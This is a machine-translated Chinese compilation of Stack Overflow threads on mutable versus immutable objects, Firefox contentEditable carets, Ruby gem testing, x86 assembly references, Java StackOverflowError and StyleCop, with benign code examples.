***可变**实例通过引用传递。*

***不可变**实例按值传递。*

抽象的例子。假设我的硬盘上存在一个名为*txtfile的文件。*现在，当你要求我给你*txtfile*文件时，我可以通过以下两种方式进行：

1.  我可以创建*txtfile*的快捷方式并将快捷方式传递给您，或者
2.  我可以制作*txtfile*文件的完整副本并将复制的文件传递给您。

在第一种模式下，返回的文件代表一个可变文件，因为对快捷方式文件的任何更改也会反映到原始文件中，反之亦然。

在第二种模式下，返回的文件代表一个不可变文件，因为对复制文件的任何更改都不会反映到原始文件中，反之亦然。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2013-09-20T17:36:16.980

如果类类型是可变的，则该类类型的变量可以具有多种不同的含义。例如，假设一个对象`foo`有一个 field `int[] arr`，并且它持有一个对`int[3]`持有数字 {5, 7, 9} 的 a 的引用。即使该字段的类型已知，它也至少可以表示四种不同的事物：

*   一个潜在共享的引用，所有的持有者只关心它封装了值 5、7 和 9。如果`foo`想要`arr`封装不同的值，它必须用包含所需值的不同数组替换它。如果想要制作 的副本`foo`，可以给副本提供对`arr`{1,2,3} 的引用或保存值的新数组，以更方便者为准。

*   唯一的引用，在宇宙中的任何地方，对封装值 5、7 和 9 的数组的引用。三个存储位置的集合，目前保存值 5、7 和 9；如果`foo`希望它封装值 5、8 和 9，它可以更改该数组中的第二项，或者创建一个包含值 5、8 和 9 的新数组并放弃旧数组。请注意，如果要制作 的副本`foo`，则必须在副本中替换`arr`为对新数组的`foo.arr`引用，以便在 Universe 中的任何位置保持对该数组的唯一引用。

*   对某个数组的引用，该数组由某些*其他*对象拥有，该对象出于某种原因将其暴露`foo`（例如，它可能想`foo`在其中存储一些数据）。在这种情况下，`arr`不封装数组的内容，而是封装它的*标识*。因为用`arr`对新数组的引用替换会完全改变其含义，所以副本`foo`应该包含对同一数组的引用。

*   对一个数组的引用，该数组`foo`是唯一的所有者，但由于某种原因被其他对象持有（例如，它希望其他对象在那里存储数据——前一种情况的另一面）。在这种情况下，`arr`封装了数组的标识及其内容。用对新数组的引用替换`arr`将完全改变其含义，但是拥有克隆的`arr`引用将违反作为唯一所有者`foo.arr`的假设。`foo`因此没有办法复制`foo`。

理论上，`int[]`应该是一个不错的简单定义良好的类型，但它有四种截然不同的含义。相比之下，对不可变对象（例如`String`）的引用通常只有一个含义。不可变对象的大部分“力量”都源于这一事实。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2020-08-04T16:37:56.603

**当用于就地操作时，**可变**集合通常比**不可变集合更快。****

 **然而，**可变性**是有代价的：您需要更加小心地在程序的不同部分之间共享它们。

**在共享可变**集合意外更新的情况下很容易创建错误，迫使您寻找大型代码库中的哪一行正在执行不需要的更新。

一种常见的方法是在函数内本地使用**可变**集合或在存在性能瓶颈的类中使用私有集合，但在速度不太受关注的其他地方使用**不可变集合。**

**这在最重要的地方为您提供了可变**集合的高性能，同时不会牺牲**不可变**集合在整个应用程序逻辑中为您提供的安全性。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2013-12-17T07:32:09.470

如果您返回数组或字符串的引用，那么外部世界可以修改该对象中的内容，从而使其成为可变（可修改）对象。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2014-01-01T06:20:09.360

不可变意味着不能改变，可变意味着你可以改变。

对象与 Java 中的基元不同。基元内置于类型（布尔、整数等）中，对象（类）是用户创建的类型。

当在类的实现中定义为成员变量时，基元和对象可以是可变的或不可变的。

很多人认为原语和对象变量前面有一个 final 修饰符是不可变的，然而，这并不完全正确。所以 final 几乎并不意味着变量不可变。请参阅此处的示例
[http://www.siteconsortium.com/h/D0000F.php](http://www.siteconsortium.com/h/D0000F.php)。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2020-07-16T12:58:39.297

**通用可变 vs 不可变**

`Unmodifiable`- 是可修改的包装器。它保证它不能直接更改（但它可能使用支持对象）

`Immutable`- 创建后无法更改的状态。当对象的所有字段都不可变时，对象就是不可变的。这是不可修改对象的下一步

**线程安全**

不可变对象的主要优点是它是一个自然的并发环境。并发的最大问题是`shared resource`可以更改任何线程。但是如果一个对象是不可变的，那么`read-only`它就是线程安全的操作。对原始不可变对象的任何修改都会返回一个副本

**真实来源，无副作用**

作为开发人员，您完全确定不可变对象的状态不能从任何地方（有意或无意）更改。例如，如果消费者使用不可变对象，他可以使用原始的不可变对象

**编译优化**

提高性能

**坏处：**

复制对象比更改可变对象更繁重，这就是为什么它有一些性能足迹

要创建一个`immutable`对象，您应该使用：

**1.语言水平**

每种语言都包含可以帮助您的工具。例如：

*   Java 有`final`和`primitives`
*   斯威夫特有`let`和`struct`[^([关于])](https://stackoverflow.com/a/59219124/4770877)。

语言定义了一种变量。例如：

*   Java 有`primitive`和`reference`类型，
*   Swift 有`value`并`reference`输入[^([About])](https://stackoverflow.com/a/59219141/4770877)。

对于`immutable`object 更方便的是默认复制的 type `primitives`。`value`至于`reference`类型，它更难（因为你可以改变对象的状态）但可能。例如，您可以`clone`在开发人员级别使用模式来制作`deep`（而不是`shallow`）副本。

**2\. 开发者级别**

作为开发人员，您不应提供用于更改状态的接口

[[Swift]](https://stackoverflow.com/a/62938749/4770877)和[[Java]](https://stackoverflow.com/a/63233142/4770877)不可变集合

# javascript - Firefox 3.03 和 contentEditable

> ID：214722
> 
> 赞同：3
> 
> 时间：2008-10-18T07:44:37.013
> 
> 标签：javascript, firefox

我在 Firefox 3.03 中的 DIV 元素上使用 contentEditable 属性。将其设置为 true 允许我按预期编辑 DIV 的文本内容。

然后，当我将 contentEditable 设置为“false”时，div 不再可编辑，也如预期的那样。

然而，即使文本不再可编辑，闪烁的插入符号（文本输入光标）仍然可见。当我单击同一页面中的大多数其他文本时，插入符号现在也可见，即使在普通文本段落中也是如此。

有没有人见过这个？有没有办法强制隐藏插入符号？

（当我调整浏览器大小或在另一个应用程序中单击并返回时，插入符号神奇地消失了。）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-18T15:37:30.537

我已经解决了这个问题，我的解决方法是在禁用 contentEditable 时清除选择：

```
if ($.browser.mozilla) { // replace with browser detection of your choice
  window.getSelection().removeAllRanges();
} 
```

我实际上正在删除 IE 以外的浏览器的“contenteditable”属性，而不是将其设置为 false：

```
if ($.browser.msie) {
  element.contentEditable = false;
}
else {
  $(element).removeAttr( 'contenteditable' );
} 
```

浏览器管理 contentEditable 属性的方式不一致，我的测试表明这总体上效果更好。我不记得这是否有助于解决插入符号问题，但我把它扔在这里以防万一。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2010-06-10T06:46:16.583

`-moz-user-input`可以在 Firefox 中使用 style 属性来使功能`contenteditable=false`正常工作。
分配的值定义是否接受用户输入。可能的值为

```
none     : The element does not respond to user input.
enabled  : The element can accepts user input. This is default.
disabled : The element does not accept user input. 
```

例如：

```
// to disallow users to enter input
<asp:TextBox ID="uxFromDate" runat="server" style="-moz-user-input: disabled;"></asp:TextBox>

// to allow users to enter input
<asp:TextBox ID="uxFromDate" runat="server" style="-moz-user-input: enabled ;"></asp:TextBox> 
```

请参阅[https://developer.mozilla.org/en/CSS/-moz-user-input](https://developer.mozilla.org/en/CSS/-moz-user-input)以获取更多参考。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-09-25T12:57:46.443

这解决了问题，看起来firefox只是在检查自己的制作方式：P

```
 getDoc().designMode  = "off"; 
```

# ruby - 部署前的 Ruby gem 测试

> ID：214730
> 
> 赞同：2
> 
> 时间：2008-10-18T07:55:52.153
> 
> 标签：ruby, testing, gem

我正在创建一个具有

*   bin目录下的几个脚本
*   lib 目录中的实用程序类
*   和测试目录中的几个测试

```
超级工具
 斌
   工具A
   工具B
 库
   超级工具
     超级工具.rb
     助手.rb
 测试
   tc_main.rb
   tc_etc.rb

```

现在，要在我安装 gem 之前运行测试，我的测试顶部有以下代码段：

```
base = File.basename(Dir.pwd)
if base == 'test' || base =~ /supertool/
   Dir.chdir('..') if base == 'test'
   $LOAD_PATH.unshift(Dir.pwd + '/lib')
   Dir.chdir('test') if base =~ /supertool/
end 
```

但这似乎很乏味，特别是如果我也必须将它们放在 bin 目录中的脚本中。有没有更好的方法来设置环境，以便我们可以在安装 gem 之前对其进行测试？我敢肯定这是我找不到的简单的东西。一个指向正确位置的简单链接会有很大帮助:)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-11-03T20:14:05.703

我不确定你想用那个脚本实现什么。好像和宝石没什么关系……

是否可以`ruby tc_main.rb`从测试目录（或`ruby test/tc_main.rb`从基本目录）中运行，并让它适当地设置加载路径？如果是这样，这是一个更好的方法：

在您的测试目录中，创建一个`test_helper.rb`文件。在那个文件中，把这个

```
$LOAD_PATH << File.expand_path( File.dirname(__FILE__) + '/../lib' ) 
```

在所有测试文件中，将第一行设置为

```
require 'test_helper' 
```

如果您的测试目录中有子目录，那么这些子目录中的文件就可以了

```
require '../test_helper' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-18T09:29:01.247

看看锄头宝石，它是其他宝石的帮手。

# reference - 一些 x86 ASM 参考/教程？

> ID：214734
> 
> 赞同：35
> 
> 时间：2008-10-18T08:00:36.747
> 
> 标签：reference, x86, assembly

我正在尝试查找有关 x86 汇编语言的一些参考资料。帮助我理解的教程/示例。-谢谢

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2008-10-18T08:06:18.310

*   [从头开始编程](http://download.savannah.gnu.org/releases/pgubook/ProgrammingGroundUp-1-0-booksize.pdf)（免费书籍，强烈推荐）
*   [x86 汇编](http://en.wikibooks.org/wiki/X86_Assembly)(wikibooks.org)
*   [x86 程序员的基本资源](http://learn86.awardspace.co.uk/)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-10-18T09:28:28.660

我推荐[**Roby 的 PC 组装教程课程**](http://web.archive.org/web/20091027095925/http://www.geocities.com/SiliconValley/Park/3230/x86asm/asmles01.html)。它也可供[下载](http://web.archive.org/web/20091027095929/http://www.geocities.com/SiliconValley/Park/3230/download/index.html)。它包含图表和示例。

*“本组装课程是针对 x86 特定的，即英特尔 8088、80286、80386 等。是的，它与您的 Pentium 或 Pentium III 兼容。AMD 用户也可以使用本教程，因为我只介绍基础知识。我假设“你已经掌握了一些编程语言，比如 Pascal、C 或 C++。我不想重新讨论编程的基本概念。”*

*   **预备课——低级基本概念**
    讨论寄存器、标志、内存、堆栈和中断。不要担心太多。你可能对很多概念感到困惑。但是，随着您的学习，我认为每个概念都应该足够清楚。
*   **第 1 章——COM 程序结构**
    通过观察最简单的程序结构开始您的汇编之旅。
*   **第 2 章——汇编**
    中的变量 发现汇编语言中变量的独特概念。这个概念与普通的高级编程语言的概念大不相同。我还解释了 mov 指令是如何工作的。
*   **第 3 章——算术指令**
    我们如何在汇编中执行一些算术运算？
*   **第 4 章 - 位逻辑，第 1 部分**
    使用 and、or 和 xor 执行各种逻辑任务，包括位掩码和翻转。
*   **第 5 章——按位逻辑，第 2 部分**
    位移和滚动有助于下一章中阐述的位掩码。
*   **第 6 章 - 分支分支**
    对于所有程序都是必不可少的。让我们尝试一些汇编分支指令来改进我们程序的逻辑。
*   **第 7 章——循环**
    汇编中的循环指令可用于模拟高级编程语言结构。
*   **第 8 章——中断要点**
    使用常见的系统中断服务来进行屏幕输出和输入。
*   **第 9 章——堆栈** 使用 push 和 pop 并了解堆栈的行为。此处解释了有关微型内存模式的一些详细信息。
*   **第 10 章——制作子程序**
    使用子程序来模拟结构化编程方法。
*   **第 11 章——宏**
    使用宏。
*   **第 12 章——数组访问**
    了解汇编如何提供非常粗略的数组访问指令。
*   **第 13 章 - 基本字符串指令**s
    使用各种字符串指令：movs、lods、cmps、scas 和 stos。
*   **第 14 章——结构**
    使用高级语言中的结构。汇编中的结构相当于 C/C++ 中的 struct 和 Pascal 中的记录。
*   **第 15 章——一点理论**
    寻址模式和内存模式解释以及计算机体系结构 101。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-10-18T08:19:49.717

我见过的最好、最全面的汇编资源是“[汇编语言艺术](http://www.plantation-productions.com/Webster/www.artofasm.com/Windows/index.html)”一书。它是免费下载的，有多个版本。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-10-18T13:22:12.807

作为参考，[英特尔 IA-32 参考手册](http://www.intel.com/products/processor/manuals/)是权威来源。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-01-07T01:56:42.980

我发现[专业汇编语言](http://www.amazon.ca/Professional-Assembly-Language-Richard-Blum/dp/0764579010)是一个好的开始。

# java - 什么是 StackOverflowError？

> ID：214741
> 
> 赞同：499
> 
> 时间：2008-10-18T08:13:55.597
> 
> 标签：java, exception, memory-leaks, out-of-memory, stack-overflow

什么是 a `StackOverflowError`，是什么原因造成的，我应该如何处理它们？

* * *

## 回答 #1

> 赞同：446
> 
> 时间：2008-10-18T08:34:31.467

参数和局部变量在**堆栈**上分配（对于引用类型，对象位于**堆上**，堆栈中的变量引用堆上的对象）。堆栈通常位于地址空间的**上端**，当它用完时，它会朝向地址空间的**底部**（即朝向零）。

您的进程也有一个**heap**，它位于进程的**底部**。当你分配内存时，这个堆会增长到地址空间的上端。如您所见，堆有可能与堆栈**“碰撞”**（有点像构造板块！！！）。

堆栈溢出的常见原因是**错误的递归调用**。通常，这是在您的递归函数没有正确的终止条件时引起的，因此它最终会永远调用自己。或者当终止条件很好时，它可能是由于在满足它之前需要太多递归调用造成的。

但是，通过 GUI 编程，可以生成**间接递归**。例如，您的应用程序可能正在处理绘画消息，并且在处理它们时，它可能会调用一个函数，该函数会导致系统发送另一条绘画消息。在这里，您没有明确称呼自己，但 OS/VM 已经为您完成了。

要处理它们，您需要检查您的代码。如果你有调用自己的函数，那么检查你是否有一个终止条件。如果有，请检查在调用函数时是否至少修改了一个参数，否则递归调用的函数将没有可见的变化，并且终止条件是无用的。另请注意，在达到有效终止条件之前，您的堆栈空间可能会耗尽内存，因此请确保您的方法可以处理需要更多递归调用的输入值。

如果您没有明显的递归函数，请检查您是否正在调用任何**间接**导致您的函数被调用的库函数（如上面的隐式案例）。

* * *

## 回答 #2

> 赞同：132
> 
> 时间：2015-03-26T13:06:54.747

为了描述这一点，首先让我们了解**局部**变量和对象是如何存储的。

局部变量存储在**堆栈**中：

![在此处输入图像描述](https://i.stack.imgur.com/SHTah.jpg)

如果您查看图像，您应该能够理解事情是如何工作的。

当 Java 应用程序调用函数调用时，会在调用堆栈上分配一个堆栈帧。堆栈帧包含被调用方法的参数、其本地参数和方法的返回地址。返回地址表示被调用的方法返回后程序继续执行的执行点。如果没有空间用于新的堆栈帧，`StackOverflowError`则由 Java 虚拟机 (JVM) 抛出。

可能耗尽 Java 应用程序堆栈的最常见情况是递归。在递归中，方法在执行期间调用自身。递归被认为是一种强大的通用编程技术，但必须谨慎使用，以避免`StackOverflowError`.

抛出 a 的示例`StackOverflowError`如下所示：

**StackOverflowErrorExample.java:**

```
public class StackOverflowErrorExample {

    public static void recursivePrint(int num) {
        System.out.println("Number: " + num);
        if (num == 0)
            return;
        else
            recursivePrint(++num);
        }

    public static void main(String[] args) {
        StackOverflowErrorExample.recursivePrint(1);
    }
} 
```

在这个例子中，我们定义了一个递归方法，调用`recursivePrint`它打印一个整数，然后调用自身，将下一个连续的整数作为参数。递归结束，直到我们`0`作为参数传入。但是，在我们的示例中，我们从 1 及其不断增加的追随者传入参数，因此，递归将永远不会终止。

`-Xss1M`使用指定线程堆栈大小等于 1 MB的标志的示例执行如下所示：

```
Number: 1
Number: 2
Number: 3
...
Number: 6262
Number: 6263
Number: 6264
Number: 6265
Number: 6266
Exception in thread "main" java.lang.StackOverflowError
        at java.io.PrintStream.write(PrintStream.java:480)
        at sun.nio.cs.StreamEncoder.writeBytes(StreamEncoder.java:221)
        at sun.nio.cs.StreamEncoder.implFlushBuffer(StreamEncoder.java:291)
        at sun.nio.cs.StreamEncoder.flushBuffer(StreamEncoder.java:104)
        at java.io.OutputStreamWriter.flushBuffer(OutputStreamWriter.java:185)
        at java.io.PrintStream.write(PrintStream.java:527)
        at java.io.PrintStream.print(PrintStream.java:669)
        at java.io.PrintStream.println(PrintStream.java:806)
        at StackOverflowErrorExample.recursivePrint(StackOverflowErrorExample.java:4)
        at StackOverflowErrorExample.recursivePrint(StackOverflowErrorExample.java:9)
        at StackOverflowErrorExample.recursivePrint(StackOverflowErrorExample.java:9)
        at StackOverflowErrorExample.recursivePrint(StackOverflowErrorExample.java:9)
        ... 
```

根据 JVM 的初始配置，结果可能会有所不同，但最终`StackOverflowError`会被抛出。这个例子是一个很好的例子，说明如果不谨慎实施，递归会如何导致问题。

***如何处理 StackOverflowError***

1.  最简单的解决方案是仔细检查堆栈跟踪并检测行号的重复模式。这些行号表示被递归调用的代码。一旦你检测到这些行，你必须仔细检查你的代码并理解为什么递归永远不会终止。

2.  如果您已验证正确实现了递归，则可以增加堆栈的大小，以允许更多的调用。根据安装的 Java 虚拟机 (JVM)，默认线程堆栈大小可能等于**512 KB 或 1 MB**。`-Xss`您可以使用该标志增加线程堆栈大小。该标志可以通过项目的配置或命令行指定。参数的格式 `-Xss`是： `-Xss<size>[g|G|m|M|k|K]`

* * *

## 回答 #3

> 赞同：69
> 
> 时间：2008-10-18T08:31:36.497

如果你有这样的功能：

```
int foo()
{
    // more stuff
    foo();
} 
```

然后 foo() 会不断地调用自己，越来越深，当用来跟踪你所在的函数的空间被填满时，你就会得到堆栈溢出错误。

* * *

## 回答 #4

> 赞同：25
> 
> 时间：2008-10-18T10:06:02.937

堆栈溢出的确切含义是：堆栈溢出。通常程序中有一个堆栈，其中包含局部范围的变量和在例程执行结束时返回的地址。该堆栈往往是内存中某处的固定内存范围，因此它可以包含多少值是有限的。

如果堆栈为空，则无法弹出，否则会出现堆栈下溢错误。

如果堆栈已满，则无法推送，否则会出现堆栈溢出错误。

所以堆栈溢出出现在你分配太多到堆栈中的地方。例如，在提到的递归中。

一些实现优化了某些形式的递归。特别是尾递归。尾递归例程是例程的形式，其中递归调用作为例程所做的最后一件事出现。这样的例行调用被简单地简化为跳转。

一些实现甚至实现了自己的递归堆栈，因此它们允许递归继续，直到系统内存不足。

如果可以的话，你可以尝试的最简单的事情就是增加你的筹码量。如果你不能这样做，那么第二好的事情是查看是否有明显导致堆栈溢出的东西。通过在调用例程之前和之后打印一些东西来尝试它。这可以帮助您找出失败的例程。

* * *

## 回答 #5

> 赞同：11
> 
> 时间：2008-10-18T08:19:15.680

堆栈溢出通常是由于函数调用嵌套太深（在使用递归时尤其容易，即调用自身的函数）或在堆栈上分配大量内存而使用堆更合适。

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2008-10-18T08:17:19.957

就像你说的，你需要展示一些代码。:-)

当您的函数调用嵌套太深时，通常会发生堆栈溢出错误。有关如何发生这种情况的一些示例，请参阅[Stack Overflow Code Golf](https://stackoverflow.com/questions/62188/stack-overflow-code-golf-closed)线程（尽管在该问题的情况下，答案故意导致堆栈溢出）。

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2012-07-17T21:23:44.393

`StackOverflowError`对堆栈和`OutOfMemoryError`堆一样。

无限递归调用会导致堆栈空间被用完。

以下示例产生`StackOverflowError`：

```
class  StackOverflowDemo
{
    public static void unboundedRecursiveCall() {
     unboundedRecursiveCall();
    }

    public static void main(String[] args) 
    {
        unboundedRecursiveCall();
    }
} 
```

`StackOverflowError`如果递归调用有界以防止不完整的内存调用（以字节为单位）的总和超过堆栈大小（以字节为单位），则可以避免。

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2008-10-18T08:43:31.357

堆栈溢出的最常见原因是**过深或无限递归**。如果这是您的问题，[本关于 Java 递归](http://danzig.jct.ac.il/java_class/recursion.html)的教程可以帮助您理解问题。

* * *

## 回答 #9

> 赞同：5
> 
> 时间：2017-03-30T11:08:57.267

A`StackOverflowError`是 Java 中的运行时错误。

当超过 JVM 分配的调用堆栈内存量时抛出它。

一个`StackOverflowError`被抛出的常见情况是调用堆栈由于过度深度或无限递归而超出。

例子：

```
public class Factorial {
    public static int factorial(int n){
        if(n == 1){
            return 1;
        }
        else{
            return n * factorial(n-1);
        }
    }

    public static void main(String[] args){
         System.out.println("Main method started");
        int result = Factorial.factorial(-1);
        System.out.println("Factorial ==>"+result);
        System.out.println("Main method ended");
    }
} 
```

堆栈跟踪：

```
Main method started
Exception in thread "main" java.lang.StackOverflowError
at com.program.stackoverflow.Factorial.factorial(Factorial.java:9)
at com.program.stackoverflow.Factorial.factorial(Factorial.java:9)
at com.program.stackoverflow.Factorial.factorial(Factorial.java:9) 
```

在上述情况下，可以通过进行程序更改来避免。但是如果程序逻辑是正确的并且它仍然发生，那么你的堆栈大小需要增加。

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2013-01-16T19:49:52.140

这是用于反转单链表的递归算法的示例。在笔记本电脑上（规格为 4 GB 内存，Intel [Core i5](https://en.wikipedia.org/wiki/Intel_Core#Core_i5) 2.3 GHz CPU 64 位和 Windows 7），此函数将遇到大小接近 10,000 的链表的 StackOverflow 错误。

我的观点是我们应该明智地使用递归，始终考虑系统的规模。

通常递归可以转换为迭代程序，它可以更好地扩展。（页面底部给出了相同算法的一个迭代版本。它在 9 毫秒内反转了一个大小为 100 万的单链表。）

```
private static LinkedListNode doReverseRecursively(LinkedListNode x, LinkedListNode first){

    LinkedListNode second = first.next;

    first.next = x;

    if(second != null){
        return doReverseRecursively(first, second);
    }else{
        return first;
    }
}

public static LinkedListNode reverseRecursively(LinkedListNode head){
    return doReverseRecursively(null, head);
} 
```

**相同算法的迭代版本：**

```
public static LinkedListNode reverseIteratively(LinkedListNode head){
    return doReverseIteratively(null, head);
}

private static LinkedListNode doReverseIteratively(LinkedListNode x, LinkedListNode first) {

    while (first != null) {
        LinkedListNode second = first.next;
        first.next = x;
        x = first;

        if (second == null) {
            break;
        } else {
            first = second;
        }
    }
    return first;
}

public static LinkedListNode reverseIteratively(LinkedListNode head){
    return doReverseIteratively(null, head);
} 
```

* * *

## 回答 #11

> 赞同：3
> 
> 时间：2020-07-09T11:15:40.643

堆栈具有取决于操作系统的空间限制。正常大小为 8 MB（在[Ubuntu](https://en.wikipedia.org/wiki/Ubuntu_%28operating_system%29) (Linux) 中，您可以检查该限制，`$ ulimit -u`并且可以类似地在其他操作系统中检查）。任何程序都在运行时使用堆栈，但要完全知道何时使用它，您需要检查汇编语言。例如，在 x86_64 中，堆栈用于：

1.  进行过程调用时保存返回地址
2.  保存局部变量
3.  保存特殊寄存器以便以后恢复它们
4.  将参数传递给过程调用（超过 6 个）
5.  其他：随机未使用的堆栈基数、金丝雀值、填充等。

如果您不了解 x86_64（正常情况），您只需要知道您使用的特定高级编程语言何时编译到这些操作。例如在 C 中：

*   (1) → 一个函数调用
*   (2)→函数调用中的局部变量（包括main）
*   (3)→函数调用中的局部变量（不是main）
*   (4) → 函数调用
*   (5) → 通常是函数调用，一般与堆栈溢出无关。

因此，在 C 中，**只有局部变量和函数调用会使用堆栈**。造成堆栈溢出的两种（独特的？）方法是：

*   在 main 或在 ( `int array[10000][10000];`)中调用的任何函数中声明过大的局部变量
*   非常深或无限的递归（同时调用太多函数）。

为了避免`StackOverflowError`你可以：

*   检查局部变量是否太大（1 MB 的顺序）→ 使用堆（malloc/calloc 调用）或全局变量。

*   检查无限递归→你知道该怎么做......纠正它！

*   检查正常的太深递归→最简单的方法是将实现更改为迭代。

另请注意，全局变量、包含库等...不使用堆栈。

仅当上述方法不起作用时，将堆栈大小更改为特定操作系统上的最大值。以 Ubuntu 为例：`ulimit -s 32768`(32 MB)。（这从来都不是我的任何堆栈溢出错误的解决方案，但我也没有太多经验。）

我省略了 C 中的特殊和/或非标准用例（例如 of`alloc()`和类似的用法），因为如果您使用它们，您应该已经确切地知道自己在做什么。

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2020-02-26T14:40:29.153

在紧要关头，以下情况会带来堆栈溢出错误。

```
public class Example3 {

    public static void main(String[] args) {

        main(new String[1]);
    }

} 
```

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2021-01-31T08:53:10.867

一个由于递归调用错误而导致 java.lang.StackOverflowError 的简单 Java 示例：

```
class Human {
    Human(){
        new Animal();
    }
}

class Animal extends Human {
    Animal(){
        super();
    }
}

public class Test01 {
    public static void main(String[] args) {
        new Animal();
    }
} 
```

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2016-02-11T23:02:33.307

这是一个例子

```
public static void main(String[] args) {
    System.out.println(add5(1));
}

public static int add5(int a) {
    return add5(a) + 5;
} 
```

StackOverflowError 基本上是当您尝试做某事时，它很可能会调用自身，并持续到无穷大（或直到它给出 StackOverflowError）。

`add5(a)`将调用自身，然后再次调用自身，依此类推。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2018-04-02T12:36:13.817

这是一个典型的例子`java.lang.StackOverflowError`......该方法递归地调用自己，没有退出`doubleValue()`，`floatValue()`等。

### 文件*Rational.java*

```
public class Rational extends Number implements Comparable<Rational> {
    private int num;
    private int denom;

    public Rational(int num, int denom) {
        this.num = num;
        this.denom = denom;
    }

    public int compareTo(Rational r) {
        if ((num / denom) - (r.num / r.denom) > 0) {
            return +1;
        } else if ((num / denom) - (r.num / r.denom) < 0) {
            return -1;
        }
        return 0;
    }

    public Rational add(Rational r) {
        return new Rational(num + r.num, denom + r.denom);
    }

    public Rational sub(Rational r) {
        return new Rational(num - r.num, denom - r.denom);
    }

    public Rational mul(Rational r) {
        return new Rational(num * r.num, denom * r.denom);
    }

    public Rational div(Rational r) {
        return new Rational(num * r.denom, denom * r.num);
    }

    public int gcd(Rational r) {
        int i = 1;
        while (i != 0) {
            i = denom % r.denom;
            denom = r.denom;
            r.denom = i;
        }
        return denom;
    }

    public String toString() {
        String a = num + "/" + denom;
        return a;
    }

    public double doubleValue() {
        return (double) doubleValue();
    }

    public float floatValue() {
        return (float) floatValue();
    }

    public int intValue() {
        return (int) intValue();
    }

    public long longValue() {
        return (long) longValue();
    }
} 
```

### 文件*Main.java*

```
public class Main {

    public static void main(String[] args) {

        Rational a = new Rational(2, 4);
        Rational b = new Rational(2, 6);

        System.out.println(a + " + " + b + " = " + a.add(b));
        System.out.println(a + " - " + b + " = " + a.sub(b));
        System.out.println(a + " * " + b + " = " + a.mul(b));
        System.out.println(a + " / " + b + " = " + a.div(b));

        Rational[] arr = {new Rational(7, 1), new Rational(6, 1),
                new Rational(5, 1), new Rational(4, 1),
                new Rational(3, 1), new Rational(2, 1),
                new Rational(1, 1), new Rational(1, 2),
                new Rational(1, 3), new Rational(1, 4),
                new Rational(1, 5), new Rational(1, 6),
                new Rational(1, 7), new Rational(1, 8),
                new Rational(1, 9), new Rational(0, 1)};

        selectSort(arr);

        for (int i = 0; i < arr.length - 1; ++i) {
            if (arr[i].compareTo(arr[i + 1]) > 0) {
                System.exit(1);
            }
        }

        Number n = new Rational(3, 2);

        System.out.println(n.doubleValue());
        System.out.println(n.floatValue());
        System.out.println(n.intValue());
        System.out.println(n.longValue());
    }

    public static <T extends Comparable<? super T>> void selectSort(T[] array) {

        T temp;
        int mini;

        for (int i = 0; i < array.length - 1; ++i) {

            mini = i;

            for (int j = i + 1; j < array.length; ++j) {
                if (array[j].compareTo(array[mini]) < 0) {
                    mini = j;
                }
            }

            if (i != mini) {
                temp = array[i];
                array[i] = array[mini];
                array[mini] = temp;
            }
        }
    }
} 
```

### 结果

```
2/4 + 2/6 = 4/10
Exception in thread "main" java.lang.StackOverflowError
2/4 - 2/6 = 0/-2
    at com.xetrasu.Rational.doubleValue(Rational.java:64)
2/4 * 2/6 = 4/24
    at com.xetrasu.Rational.doubleValue(Rational.java:64)
2/4 / 2/6 = 12/8
    at com.xetrasu.Rational.doubleValue(Rational.java:64)
    at com.xetrasu.Rational.doubleValue(Rational.java:64)
    at com.xetrasu.Rational.doubleValue(Rational.java:64)
    at com.xetrasu.Rational.doubleValue(Rational.java:64)
    at com.xetrasu.Rational.doubleValue(Rational.java:64) 
```

[这是`StackOverflowError`OpenJDK 7](https://github.com/openjdk-mirror/jdk7u-jdk/blob/master/src/share/classes/java/lang/StackOverflowError.java)中的源代码。

# .net - 为什么来自 Microsoft 的新 .NET 代码不符合 Microsoft StyleCop？

> ID：214744
> 
> 赞同：5
> 
> 时间：2008-10-18T08:18:40.593
> 
> 标签：.net, asp.net-mvc, stylecop

我刚刚下载了 ASP.NET MVC 测试版，模板不符合 StyleCop。

**为什么来自 Microsoft 的新 .NET 代码不符合 StyleCop？**

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-10-18T08:35:00.047

微软不是单一的。其中的不同群体对于 StyleCop 警告的重要性会有不同的看法。很多人宁愿早点发布，也不愿摆弄那些没有太大区别的东西。

此外，StyleCop 并不总是正确的。有时对警告最好的办法就是忽略它。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-01-27T14:32:39.767

StyleCop 检查是否符合 Microsoft 框架设计指南。

这些准则仅在构成 .NET Framework 本身的代码上*强制执行*，即使在框架本身中，偶尔也会存在失误。在其他地方，指南只是建议。

框架设计指南以印刷书籍的形式提供，并且非常有趣地阅读了贡献者关于他们同意或不同意的原因和方式以及如何最好地应用和解释规则的注释。我应该指出几个重要的事实：

*   甚至*编写*指南的人也没有同意所有这些。
*   您可能没有编写发布到野外的框架。
*   这些指导方针正在进行中，StyleCop 落后于它们。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-27T14:43:56.000

关于遵守风格警察的一些想法：

*   风格警察的规则总体上很好。

*   在某些情况下，一般规则对于特定情况来说不够好或没有意义。

*   以 Microsoft XNA 框架为例，该框架打破了许多让 FXCop 尖叫的规则。但是他们有绝对正当的理由来破坏它们，比如性能和可移植性。

